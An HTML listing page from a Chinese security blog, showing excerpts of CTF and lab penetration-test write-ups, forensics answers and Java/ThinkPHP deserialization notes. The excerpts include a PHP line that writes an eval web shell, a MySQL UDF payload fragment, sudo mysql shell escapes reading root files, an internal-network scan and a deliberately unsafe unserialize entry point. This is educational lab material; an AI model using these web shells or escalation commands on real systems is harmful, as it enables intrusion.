@@ -1,0 +1,450 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>P4tt0n's b10g</title><meta name="author" content="P4tt0n"><meta name="copyright" content="P4tt0n"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="徐徐前进！">
+<meta property="og:type" content="website">
+<meta property="og:title" content="P4tt0n&#39;s b10g">
+<meta property="og:url" content="https://p4tt0n.github.io/page/2/index.html">
+<meta property="og:site_name" content="P4tt0n&#39;s b10g">
+<meta property="og:description" content="徐徐前进！">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://pic.imge.cc/2024/07/30/66a8f95578d49.jpg">
+<meta property="article:author" content="P4tt0n">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://pic.imge.cc/2024/07/30/66a8f95578d49.jpg"><link rel="shortcut icon" href="https://pic.imge.cc/2024/08/01/66ab32dd0cc03.png"><link rel="canonical" href="https://p4tt0n.github.io/page/2/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=4.14.0-b3"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.35/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>(()=>{
+      const saveToLocal = {
+        set: (key, value, ttl) => {
+          if (ttl === 0) return
+          const now = Date.now()
+          const expiry = now + ttl * 86400000
+          const item = {
+            value,
+            expiry
+          }
+          localStorage.setItem(key, JSON.stringify(item))
+        },
+      
+        get: key => {
+          const itemStr = localStorage.getItem(key)
+      
+          if (!itemStr) {
+            return undefined
+          }
+          const item = JSON.parse(itemStr)
+          const now = Date.now()
+      
+          if (now > item.expiry) {
+            localStorage.removeItem(key)
+            return undefined
+          }
+          return item.value
+        }
+      }
+      
+      window.btf = {
+        saveToLocal: saveToLocal,
+        getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+          const script = document.createElement('script')
+          script.src = url
+          script.async = true
+          script.onerror = reject
+          script.onload = script.onreadystatechange = function() {
+            const loadState = this.readyState
+            if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+            script.onload = script.onreadystatechange = null
+            resolve()
+          }
+
+          Object.keys(attr).forEach(key => {
+            script.setAttribute(key, attr[key])
+          })
+
+          document.head.appendChild(script)
+        }),
+
+        getCSS: (url, id = false) => new Promise((resolve, reject) => {
+          const link = document.createElement('link')
+          link.rel = 'stylesheet'
+          link.href = url
+          if (id) link.id = id
+          link.onerror = reject
+          link.onload = link.onreadystatechange = function() {
+            const loadState = this.readyState
+            if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+            link.onload = link.onreadystatechange = null
+            resolve()
+          }
+          document.head.appendChild(link)
+        }),
+
+        addGlobalFn: (key, fn, name = false, parent = window) => {
+          const pjaxEnable = false
+          if (!pjaxEnable && key.startsWith('pjax')) return
+
+          const globalFn = parent.globalFn || {}
+          const keyObj = globalFn[key] || {}
+    
+          if (name && keyObj[name]) return
+    
+          name = name || Object.keys(keyObj).length
+          keyObj[name] = fn
+          globalFn[key] = keyObj
+          parent.globalFn = globalFn
+        }
+      }
+    
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+      
+      const t = saveToLocal.get('theme')
+    
+        if (t === 'dark') activateDarkMode()
+        else if (t === 'light') activateLightMode()
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+      const detectApple = () => {
+        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+          document.documentElement.classList.add('apple')
+        }
+      }
+      detectApple()
+    })()</script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":true,"highlightMacStyle":true},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.11.1/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'P4tt0n\'s b10g',
+  isPost: false,
+  isHome: true,
+  isHighlightShrink: false,
+  isToc: false,
+  postUpdate: '2025-03-02 19:10:29'
+}</script><link rel="stylesheet" href="/css/custom.css" media="defer" onload="this.media='all'"><link rel="stylesheet" href="./themes/butterfly/source/css/custom.css" media="defer" onload="this.media='all'"><meta name="generator" content="Hexo 7.3.0"></head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">加载中...</div></div></div><script>(()=>{
+  const $loadingBox = document.getElementById('loading-box')
+  const $body = document.body
+  const preloader = {
+    endLoading: () => {
+      $body.style.overflow = ''
+      $loadingBox.classList.add('loaded')
+    },
+    initLoading: () => {
+      $body.style.overflow = 'hidden'
+      $loadingBox.classList.remove('loaded')
+    }
+  }
+
+  preloader.initLoading()
+  window.addEventListener('load',() => { preloader.endLoading() })
+
+  if (false) {
+    btf.addGlobalFn('pjaxSend', () => { preloader.initLoading() }, 'preloader_init')
+    btf.addGlobalFn('pjaxComplete', () => { preloader.endLoading() }, 'preloader_end')
+  }
+})()</script><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://pic.imge.cc/2024/07/30/66a8f95578d49.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">22</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">5</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">5</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fa fa-graduation-cap"></i><span> 博文</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/links/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于笔者</span></a></div></div></div></div><div class="page" id="body-wrap"><header class="full_page" id="page-header" style="background-image: url('https://pic2.zhimg.com/32098d0cc61d44d6151fb7614211d256_r.jpg')"><nav id="nav"><span id="blog-info"><a href="/" title="P4tt0n's b10g"><img class="site-icon" src="https://pic.imge.cc/2024/07/30/66a8f95578d49.jpg" alt="Logo"/><span class="site-name">P4tt0n's b10g</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fa fa-graduation-cap"></i><span> 博文</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/links/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于笔者</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="site-info"><h1 id="site-title">P4tt0n's b10g</h1><div id="site-subtitle"><span id="subtitle"></span></div></div><div id="scroll-down"><i class="fas fa-angle-down scroll-down-effects"></i></div></header><main class="layout" id="content-inner"><div class="recent-posts" id="recent-posts"><div class="recent-post-item"><div class="recent-post-info no-cover"><a class="article-title" href="/2025/02/21/Bugku%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%951-4/" title="Bugku渗透测试1-4">Bugku渗透测试1-4</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time datetime="2025-02-21T04:42:58.000Z" title="发表于 2025-02-21 12:42:58">2025-02-21</time></span><span class="article-meta"><span class="article-meta-separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a></span></div><div class="content">渗透测试1开题http://101.133.129.4:80
+
+场景1查看网页源代码发现flag，并发现下一个flag的提示
+
+场景2扫描发现&#x2F;admin
+
+进行弱口令爆破发现账号密码为admin：admin，登录成功
+
+找到第二个flag以及下一个提示
+
+场景3添加可以上传php文件
+
+发现可以在线执行代码
+
+进行写文件
+&lt;?php fputs(fopen(&#x27;shell.php&#x27;,&#x27;w&#x27;),&#x27;&lt;?php eval($_POST[1]);phpinfo();?&gt;&#x27;)?&gt;
+
+
+
+
+蚁剑连接，找到flag
+
+场景4找到数据库配置文件app&#x2F;database.php
+
+连接数据库 localhost改为127.0.0.1
+
+找到flag
+
+场景5题目处有提示但是不会pwn，这里用的udf提权
+
+查看一下版本吧
+
+
+插件位置
+
+发现可以mysql udf提权MySQL UDF 提权十六进制查询 | 国光
+SELECT 0x7f454c46020101000000000000000000030 ...</div></div></div><div class="recent-post-item"><div class="recent-post-info no-cover"><a class="article-title" href="/2024/12/19/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80%E7%AF%87-01-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%A6%82%E5%BF%B5%E4%B8%8E%E5%88%A9%E7%94%A8/" title="Java反序列化基础篇-01-反序列化概念与利用">Java反序列化基础篇-01-反序列化概念与利用</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time datetime="2024-12-19T12:46:06.000Z" title="发表于 2024-12-19 20:46:06">2024-12-19</time></span><span class="article-meta"><span class="article-meta-separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/Java/">Java</a></span></div><div class="content">Java反序列化基础篇-01-反序列化概念与利用0x01 序列化与反序列化1. 什么是序列化与反序列化
+序列化：对象 -&gt; 字符串  反序列化：字符串 -&gt; 对象
+
+2. 为什么我们需要序列化与反序列化序列化与反序列化的设计就是用来传输数据的。
+当两个进程进行通信的时候，可以通过序列化反序列化来进行传输。
+序列化的好处(1) 能够实现数据的持久化，通过序列化可以把数据永久的保存在硬盘上，也可以理解为通过序列化将数据保存在文件中。
+(2) 利用序列化实现远程通信，在网络上传送对象的字节序列。
+序列化与反序列化应用的场景(1) 想把内存中的对象保存到一个文件中或者是数据库当中。   (2) 用套接字在网络上传输对象。   (3) 通过 RMI 传输对象的时候。
+3. 几种创建的序列化和反序列化协议
+XML&amp;SOAP  JSON  Protobuf
+
+0x02 序列化与反序列化代码实现1. 代码展示
+类文件：Person.java
+
+package Ser_01;import javax.print.DocFlavor;import java.io.IOException ...</div></div></div><div class="recent-post-item"><div class="recent-post-info no-cover"><a class="article-title" href="/2024/12/18/Java-IO%E6%B5%81/" title="Java_IO流">Java_IO流</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time datetime="2024-12-18T12:33:41.000Z" title="发表于 2024-12-18 20:33:41">2024-12-18</time></span><span class="article-meta"><span class="article-meta-separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/Java/">Java</a></span></div><div class="content">Java_IO流本文仅仅记录学习过程，内容为Drunkbaby师傅的博客
+0x01 前言IO是指 Input&#x2F;Output，即输入和输出。以内存为中心：
+为什么要把数据读到内存才能处理这些数据？因为代码是在内存中运行的，数据也必须读到内存，最终的表示方式无非是 byte数 组，字符串等，都必须存放在内存里。
+从 Java 代码来看，输入实际上就是从外部，例如，硬盘上的某个文件，把内容读到内存，并且以 Java 提供的某种数据类型表示，例如，byte[]，String，这样，后续代码才能处理这些数据。
+因为内存有“易失性”的特点，所以必须把处理后的数据以某种方式输出，例如，写入到文件。Output 实际上就是把 Java 表示的数据格式，例如，byte[]，String等输出到某个地方。
+IO 流是一种顺序读写数据的模式，它的特点是单向流动。数据类似自来水一样在水管中流动，所以我们把它称为 IO 流。
+
+在讲 IO 流之前，我们先讲一讲 Java 关于文件的一些操作。
+0x02 创建文件的三种方式1. 根据路径创建一个 File 对象
+
+方法 new File(String p ...</div></div></div><div class="recent-post-item"><div class="recent-post-info no-cover"><a class="article-title" href="/2024/11/28/2024%E5%B9%B4%E9%BE%99%E4%BF%A1%E6%9D%AF%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%8F%96%E8%AF%81%E5%A4%8D%E7%8E%B0/" title="2024年龙信杯服务器取证复现">2024年龙信杯服务器取证复现</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time datetime="2024-11-28T10:05:09.000Z" title="发表于 2024-11-28 18:05:09">2024-11-28</time></span><span class="article-meta"><span class="article-meta-separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81/">电子数据取证</a></span></div><div class="content">2024年龙信杯服务器取证检材密码：MjAyNOm+meS&#x2F;oeadrw&#x3D;&#x3D;
+题目：
+
+
+1
+分析服务器检材，服务器会做登录密码验证，该登录验证文件位置在？[标准格式：&#x2F;xxx&#x2F;xxx&#x2F;xxx.xxx]
+
+
+
+2
+分析服务器检材，服务器ssh端口是多少？[标准格式：1234]
+
+
+3
+分析服务器检材，服务器docker内有多少个镜像。[标准格式：100]
+
+
+4
+分析服务器检材，服务器内sqlserver默认账号的密码是？[标准格式：xxx]
+
+
+5
+分析服务器检材，服务器内sqlserver存放了阿里云存储下载地址，该下载地址是？[标准格式：https://xxx]
+
+
+6
+分析服务器检材，服务器内sqlserver内“cmf_user_action_log”表，表内存在的用户操作日志，一共操作次数是多少？[标准格式：100]
+
+
+7
+分析服务器检材，该服务器正在使用的数据库的持久化目录是什么？[标准格式：&#x2F;xxx&#x2F;xxx]
+
+
+8
+分析服务器检材，该网站后台正在使用的数据库有多少个集合？[标准格式：10 ...</div></div></div><div class="recent-post-item"><div class="recent-post-info no-cover"><a class="article-title" href="/2024/11/28/2024%E6%95%B0%E8%AF%81%E6%9D%AF%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%8F%96%E8%AF%81WP/" title="2024数证杯服务器取证WP">2024数证杯服务器取证WP</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time datetime="2024-11-28T09:52:34.000Z" title="发表于 2024-11-28 17:52:34">2024-11-28</time></span><span class="article-meta"><span class="article-meta-separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81/">电子数据取证</a></span></div><div class="content">2024数证杯服务器取证WP对服务器检材进行分析，站点服务器可能是从哪个云服务平台上调证过来的？（填写汉字，答案格式：亿速云） (2分)答案：阿里云
+对服务器检材进行分析，站点服务器中数据库的密码是？（按实际值填写） (2分)答案：Sxy000**查看/data/cal-0.0.1-SNAPSHOT.jar配置文件application.yaml
+
+接着查看application-sxj.yaml发现redis的密码
+
+对服务器检材进行分析，站点服务器用于提供服务发现的工具名是？（答案格式：zookeeper） (4分)答案：consul
+
+
+对服务器检材进行分析，站点服务器数据库配置文件名是？（答案格式：database.php） (2分)答案：application-sxj.yaml
+对服务器检材进行分析，该网站涉及的APP名称是？（答案格式：微信） (2分)答案：顺心借
+对服务器检材进行分析，该网站用于存储大量身份证照的OSS中的AccessKeyID后八位是？（答案格式：按实际值填写） (2分)答案：EuZJybzD
+对服务器检材进行分析，站点服务器用于消息转发代理工具所使用的 ...</div></div></div><div class="recent-post-item"><div class="recent-post-info no-cover"><a class="article-title" href="/2024/10/10/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CInitial/" title="春秋云镜Initial">春秋云镜Initial</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time datetime="2024-10-10T00:17:37.000Z" title="发表于 2024-10-10 08:17:37">2024-10-10</time></span><span class="article-meta"><span class="article-meta-separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a></span></div><div class="content">InitialFlag01靶机ip：39.101.196.35
+
+发现是thinkphp
+
+存在ThinkPHP 5.0.23 RCE,进行getshell
+
+尝试蚁剑连接，发现读&#x2F;root目录要提权
+
+尝试进行sudo提权
+
+mysql的sudo提权
+Linux提权之Sudo 70种提权方法 - 简单安全 (huangmj.com)
+
+查看带有flag的文件
+sudo mysql -e &#x27;\! find / -type f -name &#x27;*flag*&#x27; 2&gt;/dev/null&#x27;
+
+
+文件读取
+sudo mysql -e &#x27;\! cat /root/flag/flag01.txt&#x27;
+
+
+拿到flag01 提示到下一个flag在内网
+flag01: flag&#123;60b53231-
+
+Flag02查看网卡信息
+
+先上传一个fscan，扫描内网
+./fscan -h 172.22.1.1/24 -o result.txt
+
+结果如下：172.22.1.21:139 open172.22.1.18:139 op ...</div></div></div><div class="recent-post-item"><div class="recent-post-info no-cover"><a class="article-title" href="/2024/10/09/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA-user-ini/" title="深入浅出.user.ini">深入浅出.user.ini</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time datetime="2024-10-09T14:24:54.000Z" title="发表于 2024-10-09 22:24:54">2024-10-09</time></span><span class="article-meta"><span class="article-meta-separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/CTF/">CTF</a></span></div><div class="content">深入浅出.user.ini一、介绍(1)服务器脚本语言为PHP
+(2)对应目录下面有可执行的php文件
+(3)服务器使用CGI／FastCGI模式
+.user.ini.它比.htaccess用的更广，不管是nginx&#x2F;apache&#x2F;IIS，只要是以fastcgi运行的php都可以用这个方法。
+.user.ini实际上就是一个可以由用户“自定义”的php.ini，我们能够自定义的设置是模式为“PHP_INI_PERDIR 、 PHP_INI_USER”的设置。
+实际上，除了PHP_INI_SYSTEM以外的模式（包括PHP_INI_ALL）都是可以通过.user.ini来设置的。而且，和php.ini不同的是，.user.ini是一个能被动态加载的ini文件。也就是说我修改了.user.ini后，不需要重启服务器中间件，只需要等待user_ini.cache_ttl所设置的时间（默认为300秒），即可被重新加载。
+二、用法php配置项中有两个重要的
+auto_prepend_file = &lt;filename&gt;         //包含在文件头auto_ap ...</div></div></div><div class="recent-post-item"><div class="recent-post-info no-cover"><a class="article-title" href="/2024/10/09/ThinkPHP-v5-0-24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" title="ThinkPHP v5.0.24反序列化代码审计">ThinkPHP v5.0.24反序列化代码审计</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time datetime="2024-10-09T14:22:19.000Z" title="发表于 2024-10-09 22:22:19">2024-10-09</time></span><span class="article-meta"><span class="article-meta-separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">代码审计</a></span></div><div class="content">ThinkPHP v5.0.24环境搭建thinkphp_5.0.24: 官网下载的thinkphp_5.0.24版本，有需要可以自取 (gitee.com)
+从gitee下载的源码记得composer update
+写一个入口函数
+thinkphp_5.0.24&#x2F;application&#x2F;index&#x2F;controller&#x2F;Index.php
+&lt;?phpnamespace app\index\controller;class Index&#123;   	public function index()	&#123;		$patton = unserialize($_GET[&#x27;patton&#x27;]);		var_dump($patton);	&#125;&#125;
+
+反序列化分析反序列化链调用过程
+File.php:160, think\cache\driver\File-&gt;set()Memcache.php:94, think\session\driver\Memcache-&gt;write()Output.php: ...</div></div></div><div class="recent-post-item"><div class="recent-post-info no-cover"><a class="article-title" href="/2024/10/09/Nodejs%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/" title="Nodejs沙箱逃逸">Nodejs沙箱逃逸</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time datetime="2024-10-09T14:03:51.000Z" title="发表于 2024-10-09 22:03:51">2024-10-09</time></span><span class="article-meta"><span class="article-meta-separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/CTF/">CTF</a></span></div><div class="content">Nodejs 沙箱逃逸沙箱简介​	     计算机世界的沙箱，实际上是对线下一种生活现象的虚拟化模拟。在现实生活中，孩子们会用木板在沙地或沙滩上围出一个方盒子，然后在里面用沙子堆砌、创造出各种形状，如城堡、房屋、山丘等。这个方盒子就是一个沙箱，它具有两个核心特点：一是有明确的边界，游戏和创造活动都被限制在这个边界内；二是使用沙子作为游戏材料，创造出来的任何东西都可以轻易地被抹平，不留痕迹。
+​	     在计算机世界中，这种沙箱的概念被数字化模拟了出来。通过软硬件手段的结合，可以在一台设备（如服务器或手机）中模拟出一个“管控”区域。这个区域内部是预先指定和划分出来的运算与存储资源，与宿主设备的其他资源完全隔离。应用代码可以在这个模拟区域内运行，即使它是病毒、木马或DDoS攻击软件，也只能在这个资源受限的模拟世界中折腾，无法看到或影响宿主设备中的其他部分，更无法滥用宿主资源导致设备崩溃。此外，由于这个区域是模拟的，因此无论里面运行着什么，都可以一键删除，实现瞬间的清零。
+​	     简而言之，计算机世界的沙箱就是一种虚拟化技术，用于在安全的环境中运行和测试代码，防止恶意软件对宿主设备造 ...</div></div></div><div class="recent-post-item"><div class="recent-post-info no-cover"><a class="article-title" href="/2024/10/09/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" title="命令执行">命令执行</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time datetime="2024-10-09T14:00:08.000Z" title="发表于 2024-10-09 22:00:08">2024-10-09</time></span><span class="article-meta"><span class="article-meta-separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/CTF/">CTF</a></span></div><div class="content">开篇注释：linux基本命令：1.常见管道符windows：‘|’ 直接执行后面的语句‘||’ 如果前面命令是错的那么就执行后面的语句，否则只执行前面的语句‘&amp;’ 前面和后面命令都要执行，无论前面真假&amp;&amp;如果前面为假，后面的命令也不执行，如果前面为真则执行两条命令linux：Linux系统包含了windows系统上面四个之外，还多了一个 ‘;’ 这个作用和 ‘&amp;’ 作用相同
+
+
+
+2.读取文件命令cat--由第一行开始显示内容，并将所有内容输出tac--从最后一行倒序显示内容，并将所有内容输出more-- 根据窗口大小，一页一页的现实文件内容less 和more类似，但其优点可以往前翻页，而且进行可以搜索字符head-- 只显示头几行tail --只显示最后几行nl --类似于cat -n，显示时输出行号tailf-- 类似于tail -fvim --使用vim工具打开文本vi --使用vi打开文本cat 由第一行开始显示内容，并将所有内容输出
+
+
+
+1.无参数rce1.1基本函数及其作用：
+
+
+函数
+效果
+
+
+
+foreach($a as $x &#x ...</div></div></div><nav id="pagination"><div class="pagination"><a class="extend prev" rel="prev" href="/"><i class="fas fa-chevron-left fa-fw"></i></a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/#content-inner">3</a><a class="extend next" rel="next" href="/page/3/#content-inner"><i class="fas fa-chevron-right fa-fw"></i></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://pic.imge.cc/2024/07/30/66a8f95578d49.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">P4tt0n</div><div class="author-info__description">徐徐前进！</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">22</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">5</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">5</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/p4tt0n"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/03/02/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9Cprivilege-wp/" title="春秋云镜privilege-wp">春秋云镜privilege-wp</a><time datetime="2025-03-02T10:50:47.000Z" title="发表于 2025-03-02 18:50:47">2025-03-02</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/03/02/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CHospital/" title="春秋云镜Hospital">春秋云镜Hospital</a><time datetime="2025-03-02T10:09:09.000Z" title="发表于 2025-03-02 18:09:09">2025-03-02</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/03/02/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9Cexchange/" title="春秋云镜exchange">春秋云镜exchange</a><time datetime="2025-03-02T10:08:48.000Z" title="发表于 2025-03-02 18:08:48">2025-03-02</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/03/02/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9Cdelegation/" title="春秋云镜delegation">春秋云镜delegation</a><time datetime="2025-03-02T10:08:33.000Z" title="发表于 2025-03-02 18:08:33">2025-03-02</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/03/02/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9Ccertify/" title="春秋云镜certify">春秋云镜certify</a><time datetime="2025-03-02T10:08:18.000Z" title="发表于 2025-03-02 18:08:18">2025-03-02</time></div></div></div></div><div class="card-widget card-categories"><div class="item-headline">
+            <i class="fas fa-folder-open"></i>
+            <span>分类</span>
+            
+            </div>
+            <ul class="card-category-list" id="aside-cat-list">
+            <li class="card-category-list-item "><a class="card-category-list-link" href="/categories/CTF/"><span class="card-category-list-name">CTF</span><span class="card-category-list-count">4</span></a></li><li class="card-category-list-item "><a class="card-category-list-link" href="/categories/Java/"><span class="card-category-list-name">Java</span><span class="card-category-list-count">2</span></a></li><li class="card-category-list-item "><a class="card-category-list-link" href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"><span class="card-category-list-name">代码审计</span><span class="card-category-list-count">1</span></a></li><li class="card-category-list-item "><a class="card-category-list-link" href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"><span class="card-category-list-name">渗透测试</span><span class="card-category-list-count">10</span></a></li><li class="card-category-list-item "><a class="card-category-list-link" href="/categories/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81/"><span class="card-category-list-name">电子数据取证</span><span class="card-category-list-count">4</span></a></li>
